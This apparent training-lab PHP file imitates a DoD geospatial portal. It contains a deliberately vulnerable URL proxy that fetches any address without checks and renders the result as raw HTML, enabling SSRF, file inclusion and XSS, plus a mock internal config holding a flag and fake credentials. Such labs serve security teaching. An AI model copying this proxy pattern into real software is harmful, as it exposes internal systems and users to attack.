<?php
// RFI Lab 1002 — DoD Geospatial Intelligence Portal
// HackerOne Report #192940 (Medium — U.S. Dept of Defense)
// Vulnerable parameter: url (GET) — fetches any external URL with no restriction
// Vectors: RFI, XSS via rendered content, SSRF (flag at ?internal=secret)

// ── Internal SSRF target (flag only accessible via loopback) ───────────────
if (isset($_GET['internal'])) {
    header('Content-Type: text/plain; charset=utf-8');
    if ($_GET['internal'] === 'secret') {
        echo "# DoD GEOINT Portal -- Internal Configuration\n";
        echo "# /etc/dod_geoint/portal.conf\n";
        echo "# CLASSIFICATION: UNCLASSIFIED // FOR OFFICIAL USE ONLY\n";
        echo "# WARNING: Internal access only -- not exposed publicly\n\n";
        echo "[database]\n";
        echo "host     = 10.10.2.15\n";
        echo "port     = 5432\n";
        echo "name     = geoint_db\n";
        echo "user     = gis_admin\n";
        echo "password = G30INT_P0rtal_2016!\n\n";
        echo "[application]\n";
        echo "version  = 2.1.4\n";
        echo "base_url = https://████.mil/\n";
        echo "api_key  = dod-geoint-api-a3f9c2d1e7b4f60d\n\n";
        echo "[security]\n";
        echo "; flag{dod_rfi_plain_192940}\n";
        echo "secret   = flag{dod_rfi_plain_192940}\n";
        echo "jwt_key  = 7Xk2mN9pQ4rL8sT1vW5yA3bC6dE0fH\n\n";
        echo "[proxy]\n";
        echo "allow_external = true   ; BUG: should be false\n";
        echo "whitelist      =        ; BUG: empty -- no restriction\n";
        echo "endpoint       = /proxys/plain.php\n";
    } else {
        http_response_code(404);
        echo "Not Found.";
    }
    exit;
}

// ── Proxy handler ──────────────────────────────────────────────────────────
if (isset($_GET['url'])) {
    $url = trim($_GET['url']);

    $ctx = stream_context_create([
        'http' => [
            'timeout'         => 8,
            'follow_location' => 1,
            'max_redirects'   => 5,
            'user_agent'      => 'Mozilla/5.0 DoD-GeoProxy/2.1 (+https://████.mil/proxy)',
            'ignore_errors'   => true,
        ],
        'ssl' => [
            'verify_peer'      => false,
            'verify_peer_name' => false,
        ],
    ]);

    $content = @file_get_contents($url, false, $ctx);

    if ($content === false) {
        http_response_code(502);
        header('Content-Type: text/plain; charset=utf-8');
        echo 'Proxy Error: Could not fetch the requested resource. Check the URL and try again.';
    } else {
        // BUG: content returned as HTML with no sanitization — enables XSS
        header('Content-Type: text/html; charset=utf-8');
        header('X-Proxy-By: DoD-GeoProxy/2.1');
        echo $content;
    }
    exit;
}

// ── Landing page ───────────────────────────────────────────────────────────
function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
?>
<!DOCTYPE html>
<!-- ArcGIS Enterprise / ESRI Gov Portal redesign -->
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ArcGIS Enterprise — DoD GEOINT Portal</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Avenir Next','Segoe UI',Helvetica,Arial,sans-serif;background:#f4f6f8;color:#323232;font-size:13px;display:flex;flex-direction:column;min-height:100vh;}

/* ── Top govt strip ──────────────────────────────────────────────────────── */
.gov-strip{background:#1a3668;color:#8aaace;font-size:.58rem;padding:3px 16px;text-align:center;letter-spacing:.07em;text-transform:uppercase;border-bottom:1px solid #0f2450;}

/* ── Header ──────────────────────────────────────────────────────────────── */
.app-header{background:#1a3668;border-bottom:3px solid #007ac2;box-shadow:0 1px 4px rgba(0,0,0,.25);}
.app-header-inner{max-width:1280px;margin:0 auto;padding:8px 16px;display:flex;align-items:center;gap:12px;}
.esri-seal{width:42px;height:42px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 1px 3px rgba(0,0,0,.3);}
.esri-seal svg{width:26px;height:26px;fill:#1a3668;}
.hdr-text{flex:1;}
.hdr-agency{font-size:.58rem;font-weight:600;color:#8aaace;letter-spacing:.1em;text-transform:uppercase;}
.hdr-title{font-size:.95rem;font-weight:700;color:#ffffff;margin-top:1px;}
.hdr-subtitle{font-size:.6rem;color:#6a9acc;margin-top:1px;}
.hdr-right{display:flex;align-items:center;gap:10px;}
.hdr-badge{font-size:.58rem;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.25);color:#d4e4f4;padding:2px 9px;border-radius:2px;font-weight:600;letter-spacing:.08em;}
.hdr-user{font-size:.68rem;color:#8aaace;display:flex;align-items:center;gap:5px;}
.hdr-user svg{width:14px;height:14px;fill:#8aaace;}

/* ── App toolbar ─────────────────────────────────────────────────────────── */
.app-toolbar{background:#ffffff;border-bottom:1px solid #c8d4de;display:flex;align-items:stretch;}
.app-toolbar-inner{max-width:1280px;margin:0 auto;padding:0 16px;display:flex;align-items:stretch;width:100%;}
.tool-tab{font-size:.72rem;font-weight:600;color:#595959;padding:0 14px;display:flex;align-items:center;gap:6px;border-bottom:3px solid transparent;cursor:pointer;transition:all .15s;text-decoration:none;white-space:nowrap;}
.tool-tab svg{width:14px;height:14px;fill:currentColor;}
.tool-tab:hover{color:#007ac2;background:#f0f6ff;}
.tool-tab.active{color:#007ac2;border-bottom-color:#007ac2;}
.tool-divider{width:1px;background:#e8edf2;margin:6px 4px;align-self:stretch;}
.tool-spacer{flex:1;}
.tool-btn{font-size:.68rem;background:#007ac2;color:#fff;border:none;padding:5px 12px;border-radius:2px;cursor:pointer;font-family:inherit;font-weight:600;margin:5px 0;display:flex;align-items:center;gap:4px;}
.tool-btn svg{width:11px;height:11px;fill:#fff;}
.tool-btn:hover{background:#005e9e;}

/* ── Main layout ─────────────────────────────────────────────────────────── */
.app-body{max-width:1280px;margin:0 auto;padding:10px 16px;flex:1;display:grid;grid-template-columns:230px 1fr 252px;gap:10px;width:100%;}

/* ── ESRI Panel ──────────────────────────────────────────────────────────── */
.esri-panel{background:#ffffff;border:1px solid #c8d4de;border-top:3px solid #007ac2;box-shadow:0 1px 3px rgba(0,0,0,.06);}
.esri-panel-hd{padding:8px 12px;display:flex;align-items:center;gap:7px;border-bottom:1px solid #e8edf2;background:#f8fafb;}
.esri-panel-hd-icon{width:14px;height:14px;fill:#007ac2;flex-shrink:0;}
.esri-panel-title{font-size:.73rem;font-weight:700;color:#323232;}
.esri-panel-sub{font-size:.6rem;color:#888;margin-left:auto;}
.esri-panel-bd{padding:0;}

/* ── Layer list (ESRI tree) ──────────────────────────────────────────────── */
.layer-section{padding:7px 12px 4px;border-bottom:1px solid #eff2f5;}
.layer-section-title{font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#888;margin-bottom:5px;}
.layer-row{display:flex;align-items:center;gap:6px;padding:4px 0;font-size:.72rem;color:#323232;border-bottom:1px solid #f4f4f4;cursor:pointer;}
.layer-row:last-child{border-bottom:none;}
.layer-row:hover{background:#f0f6ff;margin:0 -12px;padding:4px 12px;}
.layer-check{width:14px;height:14px;accent-color:#007ac2;flex-shrink:0;}
.layer-swatch{width:12px;height:12px;border-radius:2px;flex-shrink:0;}
.layer-name{flex:1;font-size:.71rem;}
.layer-type-tag{font-size:.58rem;background:#eef5ff;color:#007ac2;border:1px solid #c0d8f0;padding:1px 4px;border-radius:2px;font-weight:600;}
.layer-opacity{font-size:.6rem;color:#aaa;}
.expand-arrow{width:10px;height:10px;fill:#aaa;flex-shrink:0;}
.layer-sublayer{padding-left:22px;font-size:.68rem;color:#666;display:flex;align-items:center;gap:5px;padding-top:2px;padding-bottom:2px;}

/* ── Map viewer ──────────────────────────────────────────────────────────── */
.map-container{display:flex;flex-direction:column;}
.map-toolbar{background:#ffffff;border:1px solid #c8d4de;border-bottom:none;padding:4px 8px;display:flex;align-items:center;gap:3px;flex-wrap:wrap;}
.map-tool-btn{width:28px;height:28px;background:#f4f6f8;border:1px solid #c8d4de;border-radius:2px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .1s;flex-shrink:0;}
.map-tool-btn:hover{background:#e8f0f8;border-color:#007ac2;}
.map-tool-btn.active{background:#007ac2;border-color:#007ac2;}
.map-tool-btn svg{width:14px;height:14px;fill:#595959;}
.map-tool-btn.active svg{fill:#fff;}
.map-tool-sep{width:1px;background:#c8d4de;height:20px;margin:0 3px;}
.map-title-bar{flex:1;font-size:.65rem;color:#666;padding-left:8px;display:flex;align-items:center;gap:10px;}
.map-coord-bar{font-family:monospace;font-size:.63rem;}
.map-zoom-badge{background:#f4f6f8;border:1px solid #c8d4de;border-radius:2px;padding:1px 6px;font-size:.62rem;color:#595959;}

.map-viewport{position:relative;border:1px solid #c8d4de;background:#b8d4e8;overflow:hidden;min-height:340px;}
.map-svg{width:100%;display:block;}

/* SVG land styles */
.land{fill:#e8ead8;stroke:#a0a890;stroke-width:.5;}
.land-hl{fill:#d8e8f4;stroke:#6aa8d4;stroke-width:.8;} /* highlighted country boundary layer */
.ocean{fill:#b8d4e8;}
.graticule{stroke:#c8dce8;stroke-width:.3;fill:none;}
.border{stroke:#a0a890;stroke-width:.4;fill:none;}
.military-dot{fill:#e63946;stroke:#fff;stroke-width:1.2;}
.map-label-city{font-size:5px;fill:#555;font-family:Arial,sans-serif;}
.map-label-country{font-size:6.5px;fill:#6a7a5a;font-family:Arial,sans-serif;font-weight:600;letter-spacing:.5px;text-transform:uppercase;}

/* Map overlays */
.map-scale{position:absolute;bottom:22px;left:10px;background:rgba(255,255,255,.85);border:1px solid #aaa;padding:2px 6px;font-size:.58rem;color:#444;display:flex;align-items:center;gap:5px;}
.map-scale-bar{width:40px;height:4px;background:#444;}
.map-credits{position:absolute;bottom:4px;right:6px;font-size:.55rem;color:#888;background:rgba(255,255,255,.75);padding:1px 4px;}
.map-legend{position:absolute;top:8px;right:8px;background:rgba(255,255,255,.9);border:1px solid #c8d4de;padding:7px 10px;font-size:.63rem;min-width:130px;box-shadow:0 1px 4px rgba(0,0,0,.1);}
.legend-title{font-weight:700;font-size:.62rem;margin-bottom:5px;color:#323232;text-transform:uppercase;letter-spacing:.05em;}
.legend-row{display:flex;align-items:center;gap:6px;margin-bottom:3px;}
.legend-swatch{width:14px;height:10px;border-radius:1px;flex-shrink:0;}
.legend-label{font-size:.62rem;color:#595959;}

.map-status-bar{background:#f8fafb;border:1px solid #c8d4de;border-top:none;padding:3px 10px;display:flex;align-items:center;gap:12px;font-size:.62rem;color:#666;}
.status-dot{width:6px;height:6px;border-radius:50%;background:#4caf50;flex-shrink:0;}
.status-sep{color:#c8d4de;}

/* ── Proxy section (below map) ───────────────────────────────────────────── */
.proxy-panel{background:#fff;border:1px solid #c8d4de;border-top:3px solid #e63946;margin-top:8px;}
.proxy-panel-hd{padding:8px 12px;background:#fff8f8;border-bottom:1px solid #fcd4d4;display:flex;align-items:center;gap:8px;}
.proxy-panel-hd-icon{width:14px;height:14px;fill:#e63946;}
.proxy-panel-title{font-size:.73rem;font-weight:700;color:#323232;}
.proxy-endpoint-badge{font-size:.62rem;background:#fff0f0;border:1px solid #f0c0c0;color:#c0392b;padding:1px 7px;border-radius:2px;font-weight:600;font-family:monospace;}
.proxy-panel-bd{padding:12px;}

.url-example{background:#1e2d3d;border-radius:3px;padding:10px 12px;font-family:'Courier New',monospace;font-size:.67rem;line-height:1.9;margin-bottom:10px;word-break:break-all;}
.ux-comment{color:#546e7a;}
.ux-host{color:#80cbc4;}
.ux-path{color:#90a4ae;}
.ux-key{color:#82aaff;}
.ux-val{color:#c3e88d;}
.ux-danger{color:#f07178;font-weight:700;}

.proxy-form{background:#f8fafb;border:1px solid #e0e8ef;border-radius:2px;padding:10px;}
.pf-label{font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#666;display:block;margin-bottom:4px;}
.pf-url-row{display:flex;gap:0;margin-bottom:6px;}
.pf-input{flex:1;border:1px solid #c8d4de;background:#fff;padding:6px 9px;font-family:monospace;font-size:.72rem;color:#323232;outline:none;border-radius:2px 0 0 2px;}
.pf-input:focus{border-color:#007ac2;box-shadow:0 0 0 2px rgba(0,122,194,.15);}
.pf-btn{background:#007ac2;color:#fff;border:none;padding:6px 16px;font-size:.72rem;font-weight:700;border-radius:0 2px 2px 0;cursor:pointer;font-family:inherit;white-space:nowrap;}
.pf-btn:hover{background:#005e9e;}
.pf-params{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-bottom:6px;}
.pf-field{display:flex;flex-direction:column;gap:3px;}
.pf-small-input{border:1px solid #c8d4de;background:#fff;padding:4px 7px;font-family:monospace;font-size:.69rem;color:#323232;outline:none;border-radius:2px;}
.pf-small-input:focus{border-color:#007ac2;}
.pf-note{font-size:.62rem;color:#888;line-height:1.6;}
.pf-note code{background:#eef2f8;border:1px solid #c8d4de;padding:1px 4px;border-radius:2px;font-size:.6rem;color:#007ac2;}

/* ── Response viewer ─────────────────────────────────────────────────────── */
.resp-wrap{display:none;margin-top:8px;}
.resp-bar{background:#f0f4f8;border:1px solid #c8d4de;border-bottom:none;padding:5px 10px;display:flex;align-items:center;gap:8px;border-radius:2px 2px 0 0;flex-wrap:wrap;}
.s200{background:#dff0d8;color:#2d6a2d;border:1px solid #c3e6cb;padding:1px 7px;border-radius:2px;font-weight:700;font-size:.67rem;}
.s502{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;padding:1px 7px;border-radius:2px;font-weight:700;font-size:.67rem;}
.resp-ct{color:#888;font-size:.63rem;}
.resp-tabs{display:flex;gap:0;margin-left:auto;}
.resp-tab{background:#fff;border:1px solid #c8d4de;color:#595959;font-size:.63rem;padding:2px 10px;cursor:pointer;font-family:inherit;transition:all .1s;}
.resp-tab.active{background:#007ac2;color:#fff;border-color:#007ac2;font-weight:700;}
.resp-tab:first-child{border-radius:2px 0 0 2px;}
.resp-tab:last-child{border-radius:0 2px 2px 0;}
.resp-body{background:#1e2d3d;border:1px solid #c8d4de;border-radius:0 0 2px 2px;padding:10px;font-family:'Courier New',monospace;font-size:.7rem;color:#a8ff78;line-height:1.55;max-height:300px;overflow:auto;white-space:pre-wrap;word-break:break-all;}
.resp-body.err{color:#f07178;}
.resp-frame{display:none;border:1px solid #c8d4de;border-top:none;border-radius:0 0 2px 2px;width:100%;height:300px;background:#fff;}

/* ── Right sidebar ───────────────────────────────────────────────────────── */
.sb-panel{background:#fff;border:1px solid #c8d4de;border-top:3px solid #007ac2;margin-bottom:8px;box-shadow:0 1px 2px rgba(0,0,0,.04);}
.sb-panel.warn{border-top-color:#e63946;}
.sb-panel.ssrf{border-top-color:#6741d9;}
.sb-hd{font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:#666;padding:6px 10px;border-bottom:1px solid #e8edf2;background:#f8fafb;display:flex;align-items:center;gap:6px;}
.sb-hd-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
.sb-bd{padding:8px 10px;}
.sb-row{display:flex;gap:5px;margin-bottom:3px;align-items:flex-start;}
.sb-lbl{color:#888;min-width:64px;flex-shrink:0;font-size:.66rem;padding-top:1px;}
.sb-val{font-weight:600;color:#323232;font-size:.66rem;word-break:break-all;}
.sb-ok{color:#2d7d32;}
.sb-warn{color:#c62828;}

/* Attack vector rows */
.av-row{padding:6px 0;border-bottom:1px solid #f0f4f8;display:flex;align-items:flex-start;gap:8px;}
.av-row:last-child{border-bottom:none;}
.av-icon{width:26px;height:26px;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;}
.av-icon svg{width:14px;height:14px;fill:#fff;}
.av-name{font-size:.71rem;font-weight:700;color:#323232;}
.av-desc{font-size:.62rem;color:#888;line-height:1.4;margin-top:1px;}
.tag-rfi{background:#e63946;}
.tag-xss{background:#e67e22;}
.tag-ssrf{background:#6741d9;}

/* SSRF network list */
.ssrf-target{font-family:monospace;font-size:.63rem;color:#007ac2;padding:3px 0;border-bottom:1px solid #f0f4f8;cursor:pointer;display:flex;align-items:center;gap:4px;}
.ssrf-target:hover{color:#005e9e;text-decoration:underline;}
.ssrf-target:last-child{border-bottom:none;}
.ssrf-target svg{width:9px;height:9px;fill:#007ac2;}

/* WMS ops */
.wms-op{display:flex;align-items:center;gap:7px;padding:4px 0;border-bottom:1px solid #f0f4f8;font-size:.68rem;}
.wms-op:last-child{border-bottom:none;}
.wms-op-name{font-weight:600;color:#323232;min-width:110px;}
.badge-get{background:#dff0d8;color:#2d6a2d;border:1px solid #c3e6cb;font-size:.58rem;padding:1px 5px;border-radius:2px;font-weight:700;}

/* ── Footer ──────────────────────────────────────────────────────────────── */
footer{background:#1a3668;border-top:1px solid #0f2450;padding:7px 16px;font-size:.6rem;color:#6a9acc;display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;flex-shrink:0;margin-top:auto;}
footer a{color:#6a9acc;text-decoration:none;}
footer a:hover{color:#8aaace;text-decoration:underline;}
.esri-logo-text{color:#fff;font-weight:700;font-size:.68rem;letter-spacing:.03em;}
</style>
</head>
<body>

<div class="gov-strip">U.S. Department of Defense — Geospatial Intelligence Services — National Geospatial-Intelligence Agency — Authorized Use Only</div>

<header class="app-header">
  <div class="app-header-inner">
    <div class="esri-seal">
      <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
    </div>
    <div class="hdr-text">
      <div class="hdr-agency">U.S. Department of Defense · National Geospatial-Intelligence Agency</div>
      <div class="hdr-title">GEOINT Data Portal</div>
      <div class="hdr-subtitle">ArcGIS Enterprise 10.9.1 — Geospatial Intelligence Services</div>
    </div>
    <div class="hdr-right">
      <div class="hdr-badge">UNCLASSIFIED // FOUO</div>
      <div class="hdr-user">
        <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2M12 11a4 4 0 100-8 4 4 0 000 8z"/></svg>
        analyst_user
      </div>
    </div>
  </div>
</header>

<div class="app-toolbar">
  <div class="app-toolbar-inner">
    <a href="index.php" class="tool-tab active">
      <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
      Map View
    </a>
    <a href="#" class="tool-tab">
      <svg viewBox="0 0 24 24"><path d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 16l4.553-2.276A1 1 0 0021 19.382V8.618a1 1 0 00-.553-.894L15 5m0 18V5m0 0L9 7"/></svg>
      Layers
    </a>
    <a href="#" class="tool-tab">
      <svg viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
      Proxy Services
    </a>
    <div class="tool-divider"></div>
    <a href="#" class="tool-tab">
      <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
      Analysis
    </a>
    <div class="tool-spacer"></div>
    <button class="tool-btn">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 010 14.14M4.93 4.93a10 10 0 000 14.14"/></svg>
      Live Services
    </button>
  </div>
</div>

<div class="app-body">

  <!-- ── Left: Layer panel ──────────────────────────────────────────────── -->
  <div>
    <div class="esri-panel" style="margin-bottom:8px;">
      <div class="esri-panel-hd">
        <svg class="esri-panel-hd-icon" viewBox="0 0 24 24"><path d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 16l4.553-2.276A1 1 0 0021 19.382V8.618a1 1 0 00-.553-.894L15 5m0 18V5m0 0L9 7"/></svg>
        <span class="esri-panel-title">Contents</span>
        <span class="esri-panel-sub">5 layers</span>
      </div>
      <div class="esri-panel-bd">
        <div class="layer-section">
          <div class="layer-section-title">Operational Layers</div>

          <div class="layer-row">
            <svg class="expand-arrow" viewBox="0 0 24 24"><path d="M9 18l6-6-6-6"/></svg>
            <input type="checkbox" class="layer-check" checked>
            <span class="layer-swatch" style="background:#6baed6;border:1px solid #4a8ab8;"></span>
            <span class="layer-name">countryBoundaryLayer</span>
            <span class="layer-type-tag">WMS</span>
          </div>
          <div class="layer-sublayer">
            <span style="color:#888;">Service:</span>
            <span style="font-family:monospace;font-size:.62rem;color:#555;">wms.geoint.mil/boundary</span>
          </div>

          <div class="layer-row" style="margin-top:4px;">
            <svg class="expand-arrow" viewBox="0 0 24 24"><path d="M9 18l6-6-6-6"/></svg>
            <input type="checkbox" class="layer-check" checked>
            <span class="layer-swatch" style="background:#e63946;border:1px solid #c0392b;"></span>
            <span class="layer-name">militaryBaseLayer</span>
            <span class="layer-type-tag">WMS</span>
          </div>

          <div class="layer-row" style="margin-top:4px;">
            <svg class="expand-arrow" viewBox="0 0 24 24"><path d="M9 18l6-6-6-6"/></svg>
            <input type="checkbox" class="layer-check" checked>
            <span class="layer-swatch" style="background:#f5a623;border:1px solid #c8841a;"></span>
            <span class="layer-name">terrainElevation</span>
            <span class="layer-type-tag">WFS</span>
          </div>

          <div class="layer-row" style="margin-top:4px;">
            <svg class="expand-arrow" viewBox="0 0 24 24"><path d="M9 18l6-6-6-6"/></svg>
            <input type="checkbox" class="layer-check" checked>
            <span class="layer-swatch" style="background:#9b59b6;border:1px solid #7d3c98;"></span>
            <span class="layer-name">populationDensity</span>
            <span class="layer-type-tag">WMS</span>
          </div>

          <div class="layer-row" style="margin-top:4px;">
            <svg class="expand-arrow" viewBox="0 0 24 24"><path d="M9 18l6-6-6-6"/></svg>
            <input type="checkbox" class="layer-check" checked>
            <span class="layer-swatch" style="background:#2ecc71;border:1px solid #27ae60;"></span>
            <span class="layer-name">coastlineFeatures</span>
            <span class="layer-type-tag">WFS</span>
          </div>
        </div>

        <div class="layer-section" style="border-bottom:none;">
          <div class="layer-section-title" style="margin-top:4px;">Basemap</div>
          <div class="layer-row">
            <svg class="expand-arrow" viewBox="0 0 24 24"><path d="M9 18l6-6-6-6"/></svg>
            <input type="checkbox" class="layer-check" checked>
            <span class="layer-swatch" style="background:#d4e8c2;border:1px solid #a8c88a;"></span>
            <span class="layer-name">Light Gray Canvas</span>
            <span class="layer-type-tag" style="background:#f5f5f5;color:#666;border-color:#ddd;">Base</span>
          </div>
        </div>
      </div>
    </div>

    <div class="esri-panel">
      <div class="esri-panel-hd">
        <svg class="esri-panel-hd-icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 010 20M12 2a15.3 15.3 0 000 20"/></svg>
        <span class="esri-panel-title">WMS Services</span>
      </div>
      <div class="esri-panel-bd" style="padding:8px 12px;font-size:.68rem;color:#595959;line-height:1.8;">
        <div style="font-weight:700;color:#323232;margin-bottom:3px;">NGA Primary Services</div>
        <div style="font-family:monospace;font-size:.62rem;">wms.geoint.mil/boundary</div>
        <div style="font-family:monospace;font-size:.62rem;">wms.geoint.mil/terrain</div>
        <div style="font-weight:700;color:#323232;margin:7px 0 3px;">Proxy Endpoint</div>
        <div style="font-family:monospace;font-size:.62rem;background:#f4f6f8;border:1px solid #e0e8ef;padding:3px 6px;border-radius:2px;">/proxys/plain.php</div>
        <div style="margin-top:6px;font-size:.62rem;color:#c0392b;font-weight:600;">⚠ No URL whitelist enforced</div>
      </div>
    </div>
  </div>

  <!-- ── Center: Map + Proxy ────────────────────────────────────────────── -->
  <div class="map-container">

    <!-- Map toolbar -->
    <div class="map-toolbar">
      <div class="map-tool-btn active" title="Pan">
        <svg viewBox="0 0 24 24" style="fill:none;stroke:currentColor;stroke-width:2;"><path d="M5 9l-3 3 3 3M9 5l3-3 3 3M15 19l-3 3-3-3M19 9l3 3-3 3M12 12h.01"/></svg>
      </div>
      <div class="map-tool-btn" title="Zoom In">
        <svg viewBox="0 0 24 24"><path d="M21 21l-4.35-4.35M17 11a6 6 0 11-12 0 6 6 0 0112 0zM11 8v6M8 11h6"/></svg>
      </div>
      <div class="map-tool-btn" title="Zoom Out">
        <svg viewBox="0 0 24 24"><path d="M21 21l-4.35-4.35M17 11a6 6 0 11-12 0 6 6 0 0112 0zM8 11h6"/></svg>
      </div>
      <div class="map-tool-btn" title="Full Extent">
        <svg viewBox="0 0 24 24" style="fill:none;stroke:currentColor;stroke-width:2;"><path d="M8 3H5a2 2 0 00-2 2v3m18 0V5a2 2 0 00-2-2h-3m0 18h3a2 2 0 002-2v-3M3 16v3a2 2 0 002 2h3"/></svg>
      </div>
      <div class="map-tool-sep"></div>
      <div class="map-tool-btn" title="Identify">
        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
      </div>
      <div class="map-tool-btn" title="Measure">
        <svg viewBox="0 0 24 24" style="fill:none;stroke:currentColor;stroke-width:2;"><path d="M2 12h20M12 2v20M7 7l10 10M17 7L7 17"/></svg>
      </div>
      <div class="map-tool-btn" title="Select Features">
        <svg viewBox="0 0 24 24" style="fill:none;stroke:currentColor;stroke-width:2;"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 9h6v6H9z"/></svg>
      </div>
      <div class="map-tool-sep"></div>
      <div class="map-title-bar">
        <span id="coordDisplay" class="map-coord-bar">Lat 38.8977° N &nbsp;|&nbsp; Lon 77.0365° W</span>
        <span class="status-sep">|</span>
        <span class="map-zoom-badge">Zoom 3</span>
        <span class="status-sep">|</span>
        <span style="font-size:.62rem;">EPSG:4326</span>
      </div>
      <div class="map-tool-btn" title="Share">
        <svg viewBox="0 0 24 24" style="fill:none;stroke:currentColor;stroke-width:2;"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
      </div>
    </div>

    <!-- Map viewport with SVG world map -->
    <div class="map-viewport" id="mapViewport">
      <svg class="map-svg" viewBox="0 0 1000 500" xmlns="http://www.w3.org/2000/svg" id="worldMap">
        <!-- Ocean -->
        <rect width="1000" height="500" class="ocean"/>

        <!-- Graticule (lat/lon grid lines) -->
        <g class="graticule">
          <line x1="0" y1="250" x2="1000" y2="250"/><!-- Equator -->
          <line x1="0" y1="139" x2="1000" y2="139"/><!-- 30N -->
          <line x1="0" y1="361" x2="1000" y2="361"/><!-- 30S -->
          <line x1="0" y1="83" x2="1000" y2="83"/><!-- 60N -->
          <line x1="0" y1="417" x2="1000" y2="417"/><!-- 60S -->
          <line x1="500" y1="0" x2="500" y2="500"/><!-- 0E -->
          <line x1="250" y1="0" x2="250" y2="500"/><!-- 90W -->
          <line x1="750" y1="0" x2="750" y2="500"/><!-- 90E -->
          <line x1="375" y1="0" x2="375" y2="500"/><!-- 45W -->
          <line x1="625" y1="0" x2="625" y2="500"/><!-- 45E -->
          <line x1="125" y1="0" x2="125" y2="500"/><!-- 135W -->
          <line x1="875" y1="0" x2="875" y2="500"/><!-- 135E -->
        </g>

        <!-- === GREENLAND === -->
        <path class="land" d="M 342,52 L 360,40 L 382,34 L 408,33 L 428,42 L 435,58 L 428,76 L 412,87 L 392,92 L 371,89 L 353,78 L 342,64 Z"/>

        <!-- === NORTH AMERICA (USA+Canada combined) === -->
        <path class="land-hl" d="
          M 42,100 L 42,70 L 64,53 L 100,50 L 142,48 L 185,50 L 224,56 L 252,62
          L 280,76 L 334,103 L 354,119 L 333,128 L 307,133 L 294,137
          L 290,154 L 276,181 L 272,184 L 252,170 L 231,178
          L 226,197 L 226,212 L 244,220 L 258,229
          L 244,220 L 226,212 L 225,206 L 208,197 L 197,187
          L 175,157 L 163,145 L 157,122 L 162,117
          L 156,112 L 140,100 L 128,90 L 83,82 Z"/>

        <!-- Cuba -->
        <path class="land" d="M 264,187 L 272,184 L 283,186 L 291,190 L 292,196 L 284,200 L 270,199 L 262,194 Z"/>

        <!-- === SOUTH AMERICA === -->
        <path class="land" d="
          M 260,229 L 278,225 L 308,222 L 332,225 L 354,229 L 373,222
          L 396,228 L 407,243 L 407,257 L 398,270 L 384,282 L 372,295
          L 364,312 L 358,329 L 353,348 L 347,365 L 339,382
          L 328,395 L 314,403 L 303,408 L 294,406 L 281,400
          L 272,392 L 267,378 L 264,361 L 267,342 L 270,322
          L 273,302 L 275,283 L 278,264 Z"/>

        <!-- === ICELAND === -->
        <path class="land" d="M 418,76 L 430,70 L 443,72 L 448,80 L 442,90 L 430,93 L 418,90 L 415,82 Z"/>

        <!-- === UNITED KINGDOM === -->
        <path class="land" d="M 470,120 L 477,114 L 485,117 L 486,126 L 479,129 L 471,125 Z"/>
        <path class="land" d="M 463,121 L 469,118 L 473,121 L 469,126 L 463,123 Z"/>

        <!-- === SCANDINAVIA === -->
        <path class="land" d="M 493,118 L 500,108 L 509,100 L 517,94 L 522,97 L 521,107 L 516,114 L 510,120 L 502,122 Z"/>

        <!-- === EUROPE (mainland) === -->
        <path class="land-hl" d="
          M 468,168 L 474,164 L 480,158 L 490,153 L 499,150
          L 511,148 L 521,150 L 530,154 L 537,162 L 540,170
          L 536,177 L 526,180 L 516,185 L 508,180 L 503,172
          L 495,175 L 488,180 L 480,176 L 472,170 Z"/>
        <!-- Iberian peninsula -->
        <path class="land" d="M 468,168 L 462,162 L 460,152 L 463,145 L 472,143 L 481,145 L 484,152 L 480,160 Z"/>
        <!-- Italy boot -->
        <path class="land" d="M 518,152 L 523,157 L 527,165 L 530,174 L 527,179 L 522,176 L 516,165 Z"/>

        <!-- === AFRICA === -->
        <path class="land" d="
          M 460,168 L 474,164 L 488,162 L 501,162 L 514,165 L 524,170
          L 532,178 L 537,188 L 539,200 L 535,212 L 529,225
          L 528,239 L 531,253 L 535,267 L 538,282 L 536,297
          L 530,312 L 528,327 L 531,341 L 536,352
          L 530,346 L 521,332 L 512,318 L 505,302 L 500,287
